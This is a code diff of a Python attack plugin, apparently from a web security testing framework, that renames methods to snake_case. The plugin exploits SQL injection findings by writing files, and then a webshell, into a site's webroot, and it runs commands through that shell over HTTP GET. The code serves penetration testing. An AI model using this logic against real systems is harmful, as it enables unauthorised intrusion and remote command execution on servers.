@@ -120,18 +120,18 @@ class sql_webshell(AttackPlugin):
         '''
         return 'shell'
 
-    def getExploitableVulns(self):
+    def get_exploitable_vulns(self):
         vulns = list(kb.kb.get('blind_sqli', 'blind_sqli'))
         vulns.extend(kb.kb.get('sqli', 'sqli'))
         return vulns
 
-    def canExploit(self, vulnToExploit=None):
+    def can_exploit(self, vulnToExploit=None):
         '''
         Searches the kb for vulnerabilities that the plugin can exploit.
 
         @return: True if plugin knows how to exploit a found vuln.
         '''
-        vulns = self.getExploitableVulns()
+        vulns = self.get_exploitable_vulns()
 
         if vulnToExploit is not None:
             vulns = [v for v in vulns if v.get_id() == vulnToExploit]
@@ -152,7 +152,7 @@ class sql_webshell(AttackPlugin):
 
         @return: True if the shell is working and the user can start calling specific_user_input
         '''
-        if not self.canExploit():
+        if not self.can_exploit():
             return []
         else:
             vulns = list(kb.kb.get('blind_sqli', 'blind_sqli'))
@@ -175,7 +175,7 @@ class sql_webshell(AttackPlugin):
 
                 # The user didn't selected anything, or we are in the selected vuln!
                 om.out.debug(
-                    'Verifying vulnerability in URL: "' + v.getURL() + '".')
+                    'Verifying vulnerability in URL: "' + v.get_url() + '".')
                 vuln_obj = bsql.is_injectable(v.get_mutant())
                 if vuln_obj:
                     tmp_vuln_list.append(vuln_obj)
@@ -214,7 +214,7 @@ class sql_webshell(AttackPlugin):
         bsql.set_eq_limit(self._eq_limit)
 
         dbBuilder = dbDriverBuilder(self._uri_opener, bsql.equal_with_limit)
-        driver = dbBuilder.getDriverForVuln(vuln_obj)
+        driver = dbBuilder.get_driver_for_vuln(vuln_obj)
         if driver is None:
             return None
         else:
@@ -225,13 +225,13 @@ class sql_webshell(AttackPlugin):
                 # Define the corresponding cut...
                 response = self._uri_opener.GET(webshell_url)
                 self._define_exact_cut(
-                    response.getBody(), shell_handler.SHELL_IDENTIFIER)
+                    response.get_body(), shell_handler.SHELL_IDENTIFIER)
 
                 # Create the shell object
                 # Set shell parameters
                 shell_obj = sql_web_shell(vuln_obj)
                 shell_obj.set_url_opener(self._uri_opener)
-                shell_obj.setWebShellURL(webshell_url)
+                shell_obj.set_web_shell_u_r_l(webshell_url)
                 shell_obj.set_cut(self._header_length, self._footer_length)
                 kb.kb.append(self, 'shell', shell_obj)
                 return shell_obj
@@ -254,7 +254,7 @@ class sql_webshell(AttackPlugin):
         upload_success = False
 
         # First, we test if we can upload a file into a directory we can access:
-        webroot_dirs = get_webroot_dirs(vuln_obj.getURL().getDomain())
+        webroot_dirs = get_webroot_dirs(vuln_obj.get_url().get_domain())
         for webroot in webroot_dirs:
 
             if upload_success:
@@ -278,8 +278,8 @@ class sql_webshell(AttackPlugin):
                 test_string = content = rand_alnum(16)
 
                 # Create the test URL
-                test_url = vuln_obj.getURL(
-                ).urlJoin(path + '/' + remote_filename)
+                test_url = vuln_obj.get_url(
+                ).url_join(path + '/' + remote_filename)
 
                 if self._upload_file(driver, remote_path, content, test_url, test_string):
                     upload_success = True
@@ -293,7 +293,7 @@ class sql_webshell(AttackPlugin):
             om.out.console('Trying to write a webshell.')
 
             # Get the extension from the vulnerable script
-            extension = vuln_obj.getURL().getExtension()
+            extension = vuln_obj.get_url().get_extension()
 
             for file_content, real_extension in shell_handler.get_webshells(extension):
 
@@ -330,14 +330,14 @@ class sql_webshell(AttackPlugin):
         om.out.debug(msg)
 
         try:
-            driver.writeFile(remote_path, content)
+            driver.write_file(remote_path, content)
             response = self._uri_opener.GET(test_url)
         except Exception, e:
             om.out.error(
                 'Exception raised while uploading file: "' + str(e) + '".')
             return False
         else:
-            if test_string in response.getBody():
+            if test_string in response.get_body():
                 return True
             else:
                 return False
@@ -347,7 +347,7 @@ class sql_webshell(AttackPlugin):
         @return: A list of the website directories.
         '''
         url_list = kb.kb.get('urls', 'url_objects')
-        url_list = [i.getPathWithoutFile() for i in url_list]
+        url_list = [i.get_path_without_file() for i in url_list]
         url_list = list(set(url_list))
         return url_list
 
@@ -449,10 +449,10 @@ class sql_webshell(AttackPlugin):
 
 
 class sql_web_shell(shell):
-    def setWebShellURL(self, eu):
+    def set_web_shell_u_r_l(self, eu):
         self._webshell_url = eu
 
-    def getWebShellURL(self):
+    def get_web_shell_u_r_l(self):
         return self._webshell_url
 
     @exec_debug
@@ -466,9 +466,9 @@ class sql_web_shell(shell):
         @param command: The command to handle ( ie. "read", "exec", etc ).
         @return: The result of the command.
         '''
-        to_send = self.getWebShellURL() + urllib.quote_plus(command)
+        to_send = self.get_web_shell_u_r_l() + urllib.quote_plus(command)
         response = self._uri_opener.GET(to_send)
-        return self._cut(response.getBody())
+        return self._cut(response.get_body())
 
     def end(self):
         om.out.debug('sql_web_shell cleanup complete.')
